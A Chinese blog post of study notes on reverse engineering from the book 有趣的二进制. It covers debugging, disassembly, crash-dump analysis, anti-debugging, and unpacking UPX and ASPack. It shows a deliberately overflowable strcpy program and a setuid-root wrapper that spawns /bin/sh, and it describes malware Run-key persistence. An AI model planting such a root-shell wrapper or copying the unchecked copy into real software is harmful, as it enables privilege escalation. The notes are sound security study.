---
title: '有趣的二进制读书笔记'
layout: post
tags: 
  - bin
  - sec
  - reverse
category: 
  - sec
  - bin
  - paper
comments: true
share: true
description: 在看有趣的二进制的时候，做了些笔记，对知识的扩充和积累。承蒙大佬们厚爱，投稿之后，竟然被发表了。
---
在看有趣的二进制的时候，做了些笔记，对知识的扩充和积累。
承蒙大佬们厚爱，投稿之后，竟然被发表了。谢谢@[re4lity](http://weibo.com/u/5887314122)和xxxx表哥，还有[mottoin](http://mottoin.com)

* TOC
{:toc}

<!--more-->


## 通过逆向学习汇编代码

### 软件分析
* 文件的创建、修改、删除
* 注册表项目的创建、修改和删除
* 网络通信   

hex比较文件内容：
![Alt text](/img/interestingBin/1476837859289.png)

  Windos程序在重启的时候，可以把自动运行的程序注册在以下注册表中：

```c
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

sample.exe执行了：
* 修改注册表以便系统重启的时候自动运行
* 将自己复制到“启动”文件夹以便在系统启动时自动运行 

### 尝试静态分析
软件分析，从方法可以分为“静态方法”和“动态方法”，它们的区别如下：

* 静态分析：在不运行目标的情况下分析

  * 阅读反汇编代码
  * 提取可执行文件中的字符串，分析使用了哪些单词 

> 从广义上来看，使用二进制编辑器查看可执行文件的内容也是静态分析


**PE文件：**
PE就是Portable Executable（可移植可执行），它是Win32可执行文件的标准格式。PE文件是跨Win32平台的，即使Windows运行在非Intel的CPU上，任何Win32平台的PE装载器都能识别和使用该文件格式但移植到不同的CPU上会PE文件执行文件必然会改变。所有Win32执行体（除了VxD和16位的Dll）都使用PE文件，包括NT内核模式的驱动程序。

Win32病毒运行：
> 有些在HOST运行过程中调用病毒代码

* 用户点击（或者系统自动运行）HOST程序
* 装载HOST程序到内存
* 通过PE文件中的AddressOfEntryPoint和ImageBase之和来定位第一条语句的位置
* 从第一条语句开始执行（此时执行的就是病毒代码）
* 病毒主体代码执行完毕，将控制权交给HOST程序原来入口代码
* HOST程序继续执行

![Alt text](/img/interestingBin/1477316082696.png)

![Alt text](/img/interestingBin/1477316128958.png)

![Alt text](/img/interestingBin/1477316142493.png)



### 动态分析

* 用调试器跟踪程序逻辑
* 获取文件和注册表访问日志
* 获取网络包
                
![Alt text](/img/interestingBin/1477318942832.png)

> "当进程名称为wsample01b.exe时输出日志"

**调试器**：发现程序问题和bug的软件，一般具有以下功能：
* 断点
* 单步跳入、跳出
* 查看寄存器和内存数据

断点是能够让程序在任意位置中断、恢复运行的功能。可以在可能会发生bug的地方稍微往前一点设置一个断点，以便找到导致问题的程序逻辑。一般来说，如果是机器语言，则以指令为单位来设置断点；如果是高级语言，则以源代码的行为单位来设置断点。断点能够在任意位置中断和恢复运行，而每执行一条指令都中断一次叫做单步跳入或跳出。通过单步运行的功能，我们可以以一条指令或一行代码为单位逐个运行程序的逻辑，仔细确认内存和变量的状态。跳入跳出的区别：

* **跳入：调用函数时进入函数内部**
* **跳出：调用函数时不进入函数内部，而是将函数调用作为一条指令来执行**
最后就是查看寄存器和内存数据了，这个功能可以再程序中断运行的状态下确认寄存器、内存和变量的状态。


    
![Alt text](/img/interestingBin/1478437148946.png)

F2下断点，F7单步跳入，F8单步跳出。
 
 寄存器是位于CPU的内部存储空间，都有自己的名字：
 
 * EAX，"累加器"(accumulator)，扩展累加寄存器，在乘法和除法中被自动使用
 * EBX，"基地址"(base)寄存器, 在内存寻址时存放基地址。
 * ECX，计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。
 * EDX，则总是被用来放整数除法产生的余数。
 * ESP，扩展堆栈指针寄存器，寻址堆栈，极少用于普通的算术运算和数据传送。
 * ESI和EDI由高速内存数据传送指令使用，通常称为扩展源指针和扩展目的指针寄存器。
 * EBP，扩展帧指针寄存器，高级语言使用EBP引用堆栈上的函数参数和局部变量。
 * EIP，指令指针，存放下一条要执行的指令的地址。（指向当前执行的指令）有些程序可以修改EIP，使程序分支转移到新的地址执行。

![Alt text](/img/interestingBin/1478442124536.png) 

在EIP下有C、P、A、Z、S、T、D、O几个字母，它们表示标志。一般会在这些字母后加上F（FLAG），CF、PF、AF、ZF，这些标志表示用于条件分支，如：

+ 若ZF为1表示跳转
+ 若CF位1表示不跳转

 > EFLAGS 寄存器由控制CPU的操作或反映CPU某些运算的结果的独立二进制位构成。当某标志等于1时就说其被置位；等于0时候就说其被清除（或复位）
 > 
 > 控制标志，控制CPU的操作。例如，某些标志位可以使CPU在每条指令执行后、检测到算术运算溢出后、进入虚拟8086模式或保护模式后中断。
 > 
 > 状态标志，反映CPU执行的算术和逻辑运算的结果，包括溢出标志、符号标志、零标志、辅助进位标志、奇偶标志、进位标志：
 > * 进位标志(CF):在无符号算术的运算结果太大而目的操作数无法容纳时置位
 > * 溢出标志(OF):在有符号算术运算结果太大或太小而无目的操作数无法容纳时置位
 > * 符号标志(SF):在算术或逻辑运算的结果位负时置位。
 > * 零标志(ZF):在算术或逻辑运算结果为零时置位。
 > * 辅助进位标志(AC):在算术运算导致8位操作数的位3到位4产生进位时置位。
 > * 奇偶标志(PF):结果最低有效字节为1的位的数目位偶数时置位，否则PF复位。通常用于在数据有可能改变或丢失的情况下检查错误。

静态分析和动态分析的区别是在于“是否运行程序”，静态偏向于“纵览全局”，动态分析偏向于“细看局部”。在软件分析的时候，首先用二进制编辑器和IDA看全局，然后再用OllyDbug看局部。

> OD对python亲和性高，WinDbg对堆内核领域的程序进行调试，分析rootkit还是离不开它。




### 汇编指令



![Alt text](/img/interestingBin/1478526772119.png)

#### 汇编语言的条件分支

汇编语言通过控制标志的cmp、test指令，以及根据标志完成分支的跳转类指令来实现。


![Alt text](/img/interestingBin/1488938985975.png)

> `test eax eax`，当eax为0时将ZF置为1.只要看到带有两个相同寄存器的test指令，一般就是条件分支，可以理解为“若寄存器值为0，则将ZF置为1”
> jnz指令的意思是，当ZF不为0时跳转。因此，将jnz和test指令结合起来就实现了
> * 若eax为0则不跳转
> * 若eax为1则跳转
> 
> eax为0040100c的call lstrcmpW的返回值

当ZF为1时程序不会进行跳转，而是继续执行0040101D的指令，从而显示"Hello!2012"这条消息。


#### 参数放在栈中

参数通过栈来传递。

`call`指令用来调用子程序，返回值放在eax中。传递给子程序的参数通过`push`放在栈中。

C语言中的函数调用：

```c
function(1,2,3)
```

汇编语言中的函数调用：

```c
push 3
push 2
push 1
call function
```
> 参数是从后往前入栈。但也会因为CPU和编译器的不同有所变化。

例如00401006位置上代码如下：

```c
00401006 push offet String2 ; "2012"
0040100B push eax           ; lpString1
0040100C call ds:__imp__lstrcmpW@8 ;lstrcmpW(X,X)
```

由于参数入栈顺序，可改成`eax=lstrcmpW(eax,"2012")`。`lstrcmpW`函数的功能是，当参数中的两个字符串相同时，则返回0，否则返回非0.

### 通过汇编指令观察程序行为

使用OD打开样本程序，然后在反汇编窗口中，右键选择Search for ->Name in all modules
![Alt text](/img/interestingBin/1488943666940.png)
从显示的的函数列表中，找到类型为Export的`RegSetValueExa`函数：
![Alt text](/img/interestingBin/1488945439284.png)
双击函数名，跳转到该函数的开头。
在Export类型的函数上，双击并设置断点。
按F9运行样本文件，程序会在断点处暂停运行。
按Ctrl+F9(运行至Return处)或者按Alt+F9(运行到用户代码处)，程序会继续运行到函数返回的地方。
![Alt text](/img/interestingBin/1488947599525.png)



```nasm
text:004013C2                 push    400h            ; nSize
.text:004013C7                 lea     eax, [esp+85Ch+Filename]
.text:004013CE                 push    eax             ; lpFilename
.text:004013CF                 push    ecx             ; hModule
.text:004013D0                 call    ds:GetModuleFileNameA
.text:004013D6                 mov     esi, ds:SHGetSpecialFolderPathA
.text:004013DC                 push    0               ; fCreate
.text:004013DE                 push    7               ; csidl
.text:004013E0                 lea     ecx, [esp+860h+pszPath]
.text:004013E4                 push    ecx             ; pszPath
.text:004013E5                 push    0               ; hwnd
.text:004013E7                 call    esi ; SHGetSpecialFolderPathA
.text:004013E9                 mov     edi, ds:lstrcatA
.text:004013EF                 push    offset String2  ; "\\0.exe"
.text:004013F4                 lea     edx, [esp+85Ch+pszPath]
.text:004013F8                 push    edx             ; lpString1
.text:004013F9                 call    edi ; lstrcatA
.text:004013FB                 mov     ebx, ds:CopyFileA
.text:00401401                 push    0               ; bFailIfExists
.text:00401403                 lea     eax, [esp+85Ch+pszPath]
.text:00401407                 push    eax             ; lpNewFileName
.text:00401408                 lea     ecx, [esp+860h+Filename]
.text:0040140F                 push    ecx             ; lpExistingFileName
.text:00401410                 call    ebx ; CopyFileA
.text:00401412                 push    0               ; fCreate
.text:00401414                 push    5               ; csidl
.text:00401416                 lea     edx, [esp+860h+pszPath]
.text:0040141A                 push    edx             ; pszPath
.text:0040141B                 push    0               ; hwnd
.text:0040141D                 call    esi ; SHGetSpecialFolderPathA
.text:0040141F                 push    offset a1_exe   ; "\\1.exe"
.text:00401424                 lea     eax, [esp+85Ch+pszPath]
.text:00401428                 push    eax             ; lpString1
.text:00401429                 call    edi ; lstrcatA
.text:0040142B                 push    0               ; bFailIfExists
.text:0040142D                 lea     ecx, [esp+85Ch+pszPath]
.text:00401431                 push    ecx             ; lpNewFileName
.text:00401432                 lea     edx, [esp+860h+Filename]
.text:00401439                 push    edx             ; lpExistingFileName
.text:0040143A                 call    ebx ; CopyFileA
.text:0040143C                 lea     eax, [esp+858h+pszPath]
.text:00401440                 lea     edx, [eax+1]
.text:00401443
.text:00401443 loc_401443:                             ; CODE XREF: sub_401380+C8j
.text:00401443                 mov     cl, [eax]
.text:00401445                 inc     eax
.text:00401446                 test    cl, cl
.text:00401448                 jnz     short loc_401443
.text:0040144A                 sub     eax, edx
.text:0040144C                 push    eax             ; cbData
.text:0040144D                 lea     eax, [esp+85Ch+pszPath]
.text:00401451                 push    eax             ; lpData
.text:00401452                 call    sub_401310
.text:00401457                 add     esp, 8
.text:0040145A                 call    sub_401220
.text:0040145F                 push    0               ; nExitCode
.text:00401461                 call    ds:PostQuitMessage
.text:00401467                 jmp     loc_40151F
```

IDA会显示出调用的函数名和参数。`00401452`处的`SetRegValue`函数以及`0040145A`处的SelfDelete函数，它们分别用来注册表值以及自身删除。

在notepad++中编写汇编代码（扩展名为asm），使用[NASM汇编器](http://nasm.us)编译成obj文件，再用[ALINK](http://alink.sourceforge.net/download.html)编译成exe文件。

```nasm
extern MessageBoxA

section .text
global main

main:
	push dword 0
	push dword title
	push dword text
	push dword 0
	call MessageBoxA
	ret
	
section .data
title: db 'MessageBox',0
text: db 'Hello World!',0

```

![Alt text](/img/interestingBin/1488957716297.png)

函数调用的过程如下：
* 要显示的消息：Hello，World！
* 要显示的消息框标题：MessageBox
* 将参数按照从后往前的顺序入栈
* 用call MessageBoxA调用函数

该exe程序在OD的显示情况：

![Alt text](/img/interestingBin/1488958231316.png)


## 内存转储和反调试

### 内存转储

#### 获取内存转储

随着程序的运行，内存中的数据会不断实时变化，如果保存某个时间点的状态(快照)，就需要内存转储。
内存转储是用于系统崩溃时，将内存中的数据转储保存在转储文件中，供给有关人员进行排错分析用途。而它所保存生成的文件就叫做内存转储文件。

**1. 在windows vista以上版本生成内存转储:**
* 打开任务管理器
* 右键点击目标进程名称
* 选择“创建转储文件”


![创建转储文件](/img/interestingBin/1488961482669.png)

![Alt text](/img/interestingBin/1488961552492.png)

> 尽管操作系统会按照可执行文件中的内容将程序加载到内存中，但内存中的数据与可执行文件中的数据并不安全相同

**2.在windows xp及以下的版本系统生成内存转储**

在运行中输入Drwatson，或者是在附件->系统工具->系统信息中打开Drwatson，生成内存转储文件和日志。

![Alt text](/img/interestingBin/1488964523913.png)

日志记载了崩溃的应用程序名称、崩溃发生时间、用户名、操作系统版本以及其他正在运行的进程列表等全局信息。从错误的代码可以看出是，对内存非法访问。

接下来的模块清单中，记载了崩溃时，进程所加载的模块，从中可以确认每个模块各自映射的内存地址。

```nasm
错误 ->004012bf 668911           mov     [ecx],dx              ds:0023:00000000=????
        004012c2 8b4d08           mov     ecx,[ebp+0x8]
        004012c5 50               push    eax
        004012c6 51               push    ecx
        004012c7 ff15a8204000     call    dword ptr [guitest+0x20a8 (004020a8)]
        004012cd b801000000       mov     eax,0x1
        004012d2 5d               pop     ebp
        004012d3 c21000           ret     0x10
        004012d6 3b0d00304000     cmp     ecx,[guitest+0x3000 (00403000)]
        004012dc 7502             jnz     guitest+0x12e0 (004012e0)
        004012de f3c3             rep     ret
```

> 在地址`004012bf`的mov指令旁边写着一个“错误字样”，mov[ecx],dx 这条指令的功能是将dx的值写入ecx所代表的内存地址中。查看寄存器，发现ecx的值为00000000，将数据写入00000000的地址会引起崩溃。

#### 有效运行实时调试

在OllyDbg的菜单中点击Options->Just-in-time debugging，会弹出一个设置对话框。点击“Make OllyDbg just-in-time debugger”按钮，OllyDbg就会将自己的信息配置到上述注册表项目中。 

![设置OD为实时调试器](/img/interestingBin/1488981072395.png)

将OD设置为实时调试器之后，再一次运行该会崩溃的程序。这次程序崩溃后，OD会自动打开，挂载到崩溃的进程上。（**管理员运行会崩溃的程序，OD才会自动被打开**）

实时调试对于处理一些难以重新的Bug非常有效。


#### 通过转储文件寻找出错原因

当程序崩溃时，最好能够在第一时间启动调试器，但有些情况无法做到这一点。这时候，只要留下转储文件，也能通过它找到出错的原因。

转储文件可以使用WinDbg来分析。

打开WinDbg，然后按Ctrl+D或者点击菜单中的File->Open Crash Dump，打开转储文件。

![Alt text](/img/interestingBin/1488982085948.png)

WinDbg虽然有图形界面，但实际上却更像是一个命令行工具，因为它基本上是通过命令交互来进行调试。因此，和OD相比，WinDbg更难上手，但有些情况只能用WinDbg。例如，64位程序以及运行在内核领域的程序。

第一次启动只有一个command窗口，从view菜单可以显示更多的窗口。

* **Alt+6:显示Call Stack(调用栈)窗口**
* **Alt+7:显示Disassembly(反汇编)窗口**

调用栈：
![调用栈](/img/interestingBin/1488982549799.png)
反汇编窗口：
![反汇编](/img/interestingBin/1488982573470.png)

这里本来应该显示反汇编之后的代码，但由于EIP值为00000000,因此此处是一对问号，这就表示“出于某些原因，程序跳转到`00000000`这个值”

追溯一下函数调用的过程。从Call Stack窗口中可以看到：
```
0003044c 00000111 00000001 guitest2+0x12d0
```
双击这一行，再看下Disassembly窗口，这时候会显示处`guitest2+0x12d0`地址的内容。

![Alt text](/img/interestingBin/1488985307660.png)

当前显示的地址是`004012d0`，我们看一下前一条指令`call eax`，按Alt+4可以查看寄存器的值。

![寄存器值](/img/interestingBin/1489025129943.png)

eax寄存器的值是`00000000`,也就是说，`004012ce`的这条call eax指令调用了00000000这个地址，这个就是引起崩溃的原因。

地址`004012c8`处也执行了一条call指令，由于返回值会存放在`eax`中，因此可以推测，eax的00000000是从这来的。
按`Alt+5`打开Memory(内存窗口)，在显示Virtual的地方输入`00402004`

在显示Virtual的地方输入“00402004”

地址00402004的值为04240000(=00002404)

这里显示的的值是相对于基地址的偏移量，因此再输入`00400000+2404`，这时会显示出调用的函数名称，即`GetProcAddress`.

![Alt text](/img/interestingBin/1489025726105.png)

相同的，地址004012bc所call的函数是LoadLibraryW
![Alt text](/img/interestingBin/1489027563784.png)

将内存窗口确认下调用这些函数所传递的参数，将汇编代码改成更易懂 的形式。


```nasm
004012b7 6844214000      push     "kernel31.dll"
004012bc ff1500204000    call    LoadLibraryW
004012c2 6860214000      push    "GetCurrentProcessID"
004012c7 50              push    eax
004012c8 ff1504204000    call    GetProcAddress
004012ce ffd0            call    eax
004012d0 8b4d08          mov     ecx,dword ptr [ebp+8]
004012d3 0fb7c6          movzx   eax,si
```

`LoadLibraryW`函数的参数为kernel31.dll，但实际上系统中没有 kernel31.dll这个DLL文件，因此LoadLibraryW函数会调用失败。到这里程序还没有崩溃，但后面的GetProcAddress函数也会调用失败。随后，失败的GetProcAddress函数返回了00000000，于是`call eax`时进程就异常终止。

通过分析转储文件，可以找到一些导致意外错误的原因并进行修改。

> Windows、Linux、Mac OSX等一般的主流操作系统中都具备内存转储和调试等帮助软件分析的功能。利用此功能可以实现其他的一些好的或坏的目的。

> JAVA具有跨平台性，采用了两种技术。在编译时，源码会被编译成字节。各种环境分别安装能够解释和执行字节码的虚拟机。对Java编写的程序进行分析，实际上是就相当于对Java的字节码进行分析。有一些工具能够将字节码还原成源码，这些工具称为反编译工具。相比x86汇编语言，Java字节码更容易还原成源码。

### 防止软件被人分析


#### 反调试技术


##### IsDebuggerPresent
IsDebuggerPresent是一种能够检测是否挂载了调试器的API函数，通过返回值是否为0可以判断调试器的挂载状态。

```c
#include <Windows.h>
#include <stdio.h>

int main(){
	if(IsDebuggerPresent()){
		//在调试器运行
		printf("on debugger\n");
	}else{
	//在调试器不运行
	printf("not on debugger\n")
	}
	getchar();
	return 0;
}
```

> 若希望在开发时方便调试，又要在发布之后防止破解，这一函数非常有用。在开发时，用ifdef或者注释来暂时禁用IsDebuggerPresent的调用，在发布版本再启用，再检测到调试器时改变程序逻辑。

除外还有其他类似的API函数，如`CheckRemoteDebuggerPresent`

```c
BOOL WINAPI CheckRemoteDebuggerPresent(
	_In_ HANDLE hProcess,
	_Inout_ PBOOL pbDebuggerPresent
);
```

除了API函数，还有很多技术可以用于检测调试器。比如`anti-debug popf`和"anti-debug int2d"。

* 利用popf和SINGLE_STEP异常来检测调试器的方法。当返回值为0时为正常，为1则表示挂载了调试器。
* 利用`int 2dh`，当返回值为0是正常，为1表示挂载了调试器。

##### 通过代码混淆防止分析

若用了反汇编器进行静态分析，找到检测调试器逻辑(例如调用IsDebuggerPresent地方)，就可以轻易破解反调试器技术。用调试器从头开始追踪，也能找到检测调试器的逻辑。

例如：

调用IsDebuggerPresent的部分，其机器语言代码为`FF 15 00 20 40 00 85 C0 74 17`(截至到jz指令)

```nasm
00401000					main proc near
00401000 FF 15 00 20 40 00  call ds:__imp__IsDebuggerPresent@0
00401006 85 C0				test eax,eax
00401008 74 17 				jz short loc_401021
```

在此，若再前面增加一个EB，即变成`EB FF 15 00 20 40 00 85 C0 74 17`,在IDA显示的代码就会变成：


```nasm
FF 15 00 20 40 00 85 C0 74 17
```

此处的指令变成了jmp、adc、test、jz，而call指令消失了，然而这段机器语言的实际功能却没有发生变化，因为EB FF相当于向前跳转1个字节，也就是跳转到00401001。
而00401001后面的机器语言代码为FF 15 00 20 40 00 85 C0 74 17，这段代码反汇编之后得到的指令是call、test、jz，因此call依然能够正常执行。

这里的关键点就是00401001处的FF，它可以当作前面jmp指令的一部分，也可以当作后面call指令的一部分。而IDA会从前往后按顺序进行反汇编，因此显示出的代码可能会和实际执行的代码不同。

> 可阅读代码混淆的优秀论文。比如[Obfuscation of Executable Code to Improve Resistance to
Static Disassembly ](https://www2.cs.arizona.edu/solar/papers/CCS2003.pdf)和[Binary Obfuscation Using Signals](https://www2.cs.arizona.edu/solar/papers/obf-signal.pdf)

##### 将可执行文件压缩
除了反调试和混淆，用打包器将可执行文件压缩防止软件分析，压缩之后依然可以运行。

打包器最有名的是叫做[UPX](https://github.com/upx/upx)的，支持EIF、DLL、COFF等多种可执行文件格式。

**打包器的原理非常简单，就是将原本可执行文件中的代码和数据进行压缩，然后将解压缩的代码放在前面，运行的时候先将原本的可执行数据解压缩出来，然后再运行解压缩后的数据。**

也有一些打包器的目的不是压缩，而是反调试(防止逆向工程)。比如[ASPack](http://www.aspack.com/).

**剖析例子：**
源码如下：

```c
#include <Windows.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
	if(argc < 2){
		fprintf(stderr, "$packed.exe <password>\n");
		return 1;
	}
	if(IsDebuggerPresent()){
		// 在调试器上运行
		printf("on debugger\n");
		return -1;
	}else{
		// 不在调试器上运行
		if(strcmp(argv[1], "unpacking") == 0){
			printf("correct!\n");
		}else{
			printf("auth error\n");
			return -1;
		}
	}
	getchar();
	return 0;
}
```

>该程序简单，首先它会调用`IsDebuggerPresent`检测调试器是否存在。然后向程序传参数为“unpacking”这个字符串，则显示correct，否则auth error。

编译源码后，使用IDA看：

```nasm
.text:00401000 _main           proc near               ; CODE XREF: ___tmainCRTStartup+11Dp
.text:00401000
.text:00401000 argc            = dword ptr  8
.text:00401000 argv            = dword ptr  0Ch
.text:00401000 envp            = dword ptr  10h
.text:00401000
.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 cmp     [ebp+argc], 2
.text:00401007                 jge     short loc_401028
.text:00401009                 push    offset Format   ; "$packed.exe <password>\n"
.text:0040100E                 call    ds:__iob_func
.text:00401014                 add     eax, 40h
.text:00401017                 push    eax             ; File
.text:00401018                 call    ds:fprintf
.text:0040101E                 add     esp, 8
.text:00401021                 mov     eax, 1
.text:00401026                 pop     ebp
.text:00401027                 retn
.text:00401028 ; ---------------------------------------------------------------------------
.text:00401028
.text:00401028 loc_401028:                             ; CODE XREF: _main+7j
.text:00401028                 call    ds:IsDebuggerPresent
.text:0040102E                 test    eax, eax
.text:00401030                 jz      short loc_401045
.text:00401032                 push    offset aOnDebugger ; "on debugger\n"
.text:00401037                 call    ds:printf
.text:0040103D                 add     esp, 4
.text:00401040                 or      eax, 0FFFFFFFFh
.text:00401043                 pop     ebp
.text:00401044                 retn
.text:00401045 ; ---------------------------------------------------------------------------
.text:00401045
.text:00401045 loc_401045:                             ; CODE XREF: _main+30j
.text:00401045                 mov     eax, [ebp+argv]
.text:00401048                 mov     eax, [eax+4]
.text:0040104B                 mov     ecx, offset aUnpacking ; "unpacking"
.text:00401050
.text:00401050 loc_401050:                             ; CODE XREF: _main+6Aj
.text:00401050                 mov     dl, [eax]
.text:00401052                 cmp     dl, [ecx]
.text:00401054                 jnz     short loc_401070
.text:00401056                 test    dl, dl
.text:00401058                 jz      short loc_40106C
.text:0040105A                 mov     dl, [eax+1]
.text:0040105D                 cmp     dl, [ecx+1]
.text:00401060                 jnz     short loc_401070
.text:00401062                 add     eax, 2
.text:00401065                 add     ecx, 2
.text:00401068                 test    dl, dl
.text:0040106A                 jnz     short loc_401050
.text:0040106C
.text:0040106C loc_40106C:                             ; CODE XREF: _main+58j
.text:0040106C                 xor     eax, eax
.text:0040106E                 jmp     short loc_401075
.text:00401070 ; ---------------------------------------------------------------------------
.text:00401070
.text:00401070 loc_401070:                             ; CODE XREF: _main+54j
.text:00401070                                         ; _main+60j
.text:00401070                 sbb     eax, eax
.text:00401072                 sbb     eax, 0FFFFFFFFh
.text:00401075
.text:00401075 loc_401075:                             ; CODE XREF: _main+6Ej
.text:00401075                 test    eax, eax
.text:00401077                 jnz     short loc_401091
.text:00401079                 push    offset aCorrect ; "correct!\n"
.text:0040107E                 call    ds:printf
.text:00401084                 add     esp, 4
.text:00401087                 call    ds:getchar
.text:0040108D                 xor     eax, eax
.text:0040108F                 pop     ebp
.text:00401090                 retn
.text:00401091 ; ---------------------------------------------------------------------------
.text:00401091
.text:00401091 loc_401091:                             ; CODE XREF: _main+77j
.text:00401091                 push    offset aAuthError ; "auth error\n"
.text:00401096                 call    ds:printf
.text:0040109C                 add     esp, 4
.text:0040109F                 or      eax, 0FFFFFFFFh
.text:004010A2                 pop     ebp
.text:004010A3                 retn
```

直接编译之后，静态分析，无论是程序逻辑和流程，还是用于对比参数的字符串，以及输出的内容，都原原本本地展现了出来。

接下来用，UPX打包一下：

![upx打包](/img/interestingBin/1489043494211.png)
IDA Pro分析：
![Alt text](/img/interestingBin/1489046354996.png)

程序变得复杂。用二进制编辑器打开可执行文件，我们也无法找到correct!、author error等字符串。这也就是打包器能够防止逆向地原因。

##### 将压缩过的文件解包

一般地，打包器和解包器是配套的。除了UPX外(加参数-d，尽管无法还原到一模一样，但还是可以用IDA分析)，以防止逆向工程为目的地打包器通常都没有解包器。因此要想解包只能自立更受手动完成或者使用某些第三方制作地解包器。

手动解包，就是用调试器和反汇编器跟踪可执行文件解压缩地逻辑，并将位于内存中地解压缩后地可执行数据导出到文件的操作。

每种打包器的压缩算法不同，若解包器本身还附带反调试代码就会让分析变得更加困难。


##### 通过手动解包UPX来理解工作原理

下载[OllyDump](http://www.openrce.org/downloads/details/108/OllyDump)，并放于OD的插件目录下。。


用OllyICE打开upxpack.exe。开头的pushad指令的功能，是将所有寄存器的值撤退(复制)到栈。
继续按F8跟进，按了一会，程序再这个地方进入了循环。

![Alt text](/img/interestingBin/1489050195631.png)

> 该段的逻辑是，esi的地址向edi的地址复制数据。从复制的目标，即edi的地址可以看出，是从00401000开始逐字节进行复制。

按F8继续运行，但为了省时，直接再下面代码中找到popad指令，然后再这里设置一个断点，并按F9运行到断点的位置。
![](/img/interestingBin/1489052201829.png)


在popad下面不远处的`00407B74`有一个jmp指令，按F8单步运行到jmp指令的地方，会跳转到`00401341`处的一条call指令上。

在`004013141`处，打开OllyDump，Dump debugged process。
![Alt text](/img/interestingBin/1489053134668.png)

这样就完成解包，打开解包后的程序，观察`00401000`处之后的反汇编代码，和原程序的一样。


**将打包器添加的用于解压缩的那部分代码在OllyDbg上运行，然后将解压缩到内存中的可执行数据用OllyDump转储到文件中。其实，开头的pushad和最后的popad中间的逻辑就是用于解压缩的程序。**

**具体的就是，在运行解压缩程序之前，先将当前的寄存器状态保存到栈中，在解压缩结束之后再从栈中恢复寄存器状态。这样一来，寄存器的值就恢复到了运行解压缩程序之前的状态，便于正确运行解压缩之后的真正的程序代码。**

**总之，大部分打包器都是使用此原理，因此一定会在某个时间点完成解压缩，然后切换到真正的程序。手动解包的关键就是“找到解压缩程序结束的瞬间(位置)”**


##### 用硬件断点对ASPack进行解包

对于[ASPack](http://ch.aspack.com/)的解包，基本方法也是找到和pushed相对应的popad.但找到对应的popad非常困难，因此需要下硬件断点。

**硬件断点和软件断点的区别：**

**软件断点的原理很简单，本质就是调试器将断点位置的指令改成0xCC(int3h)。处理器遇到`0xCC`指令，会通过操作系统将异常报告给调试器，因此，只要在指定位置写入`0xCC`，就可以在任意的时间和位置中断程序运行.**

**硬件断点,和软件断点一样，硬件断点也可以中断程序运行并向调试器发出报告，但它并非通过`0xCC`指令来实现，而是通过直接写入寄存器(DR寄存器)来实现的。此外硬件断点不仅能够在指定的位置中断程序运行，还可以实现一些复杂的中断，“例如当向指定地址写入数据时中断”“当从指定地址读取数据时中断”等。换言之，硬件断点比软件断点功能强大**。不过，硬件断点数量有限。软件断点地设置数量是没有限制地，但硬件断点却只能设置四个(因为处理器只设计了4个硬件断点)。

在软件分析过程中，遇到`0xCC`可能会被覆盖地情况时，一般会用硬件断点。

案例分析：

用OD打开ASPack打包地可执行文件，并按下“Ctrl+G”输入`00401000`(一直往下找肯定能找到popad，但这种找很费力。可以在`00401000`处下一个硬件断点。若操作系统启用了ASLR安全机制，那么该地址有可能不是00401000，此时只能找popad)
![Alt text](/img/interestingBin/1489055719970.png)

由于可执行数据没有解包，因此现在这些数据是无法进行反汇编。
接下来在`00401000`处设置硬件断点，右键->Breakpoint->Hardware,on execution

![下硬件断点](/img/interestingBin/1489056152865.png)

接下来，按F9运行程序，然后程序会在00401000处中断运行。此时，可执行数据已经解包，画面未出现反汇编代码，这时候按下Ctrl+A，OllyDbg会重新分析程序代码。

![Alt text](/img/interestingBin/1489074601086.png)

后面的操作就跟UPX完全一样，使用OllyDump将文件导出，解包工作就完成。

> 当然，在这个工作中，走了不少弯路，手贱地将硬件断点下在dll里面，后面调试跳不出dll，问了同学在找到问题所在。在查看->断点中，删除了dll地断点，进入程序调试界面，开始脱壳。也可使用ESP定律。

无论什么软件，其本质都是处理器可以解释并指定地机器语言指令，因此“即便采取了难度再高地对策，只要能够读出组成软件地所有机器语言指令，就一定能找到破解地方法”


## 利用软件漏洞进行攻击

靶机：
* [Ubuntu-12.04](http://07c00.com/tmp/Ubuntu-12.04_binbook.zip):
  * 用户名:root 密码:root
  * 用户名:guest 密码:guest

* [FreeBSD-8.3](http://07c00.com/tmp/FreeBSD_8.3_binbook.zip)
  * 用户名:root 密码:root
  * 用户名:guest 密码:guest

### 利用缓冲区漏洞溢出执行任意代码

#### 引发缓冲区溢出示例
缓冲区溢出：输入的数据超出了程序规定地内存范围，数据溢出导致程序发生异常

例子：

```c
#include <string.h>

int main(int argc, char *argv[])
{
    char buff[64];
    strcpy(buff, argv[1]);
    return 0;
}
```

![缓冲区溢出](/img/interestingBin/1489113763977.png)

> 该程序具有缓冲区溢出功能。这个程序为buff数组分配一块64字节地内存空间，但传递地参数argv[1]是由用户任意输入，因此参数长度很有可能超过64字节。
> strcpy用于复制字符串，一直复制字符串到字符串地边界，即遇到"\0"为止。当用户故意向程序传递一个超过64字节地字符串时，就会在main函数中引发缓冲区溢出。

#### 让普通用户用管理员权限运行程序

Linux和FreeBSD中有一个用来修改密码的命令“passwd”。密码一般保存在`/etc/master.passwd`、`/etc/passwd`、`etc/shadow`等中，没有root权限无法修改这些文件。

`setuid`的功能是让用户使用程序的所有者权限来运行程序。

```c
$ ls -l /etc/passwd
-rw-r--r--  1 root  wheel  1438 Apr 29  2013 /etc/passwd
$ ls -l /usr/bin/passwd
-r-sr-xr-x  2 root  wheel  6360 Apr 10  2012 /usr/bin/passwd
```

> `/etc/passwd`文件不允许除root以外的用户进行写入，但passwd命令可以(通过setuid机制)临时root全新啊运行。

> “r-s”中的s表示该程序已启用setuid

```c
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[])
{
    char *data[2];
    char *exe = "/bin/sh";

    data[0] = exe;
    data[1] = NULL;

    setuid(0);
    execve(data[0], data, NULL);
    return 0;
}
```

> 调用execve函数运行/bin/sh

root权限编译该程序，然后设置setuid。`ls -l`查看权限，已经启用了setuid

![setuid](/img/interestingBin/1489114760927.png)


